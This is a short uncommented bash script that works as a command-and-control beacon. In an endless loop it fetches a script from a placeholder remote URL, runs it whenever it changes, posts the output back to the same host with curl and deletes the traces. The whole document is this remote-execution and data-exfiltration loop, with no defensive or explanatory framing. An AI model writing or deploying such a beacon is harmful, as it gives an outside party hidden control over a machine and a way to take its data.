prevInstr="no way this would be repeated as the instruction"
add="yourSecret.app.com/yourSecretContext"
pollingIter=0
exeIter=0
period=1
while true
do
	pollingIter=$((pollingIter+1))
	echo "Polling iteration"
	echo $pollingIter 
	curl $add > instructions.sh
	instr=`cat instructions.sh`
	if [ "$instr" != "$prevInstr" ]; then
		period=1	
		exeIter=$((exeIter+1))		
		echo "Executing iteration"
		echo $exeIter
		prevInstr=$instr
		chmod +x instructions.sh
		./instructions.sh > answer
		value=`cat answer`
		curl --data "payload=$value" $add > resp
		rm resp
		rm answer
		rm instructions.sh
	fi
	echo "."; echo "."; echo "."
	sleep $period
	if [ $period != 30 ]; then
		period=$((period+1))
	fi
done
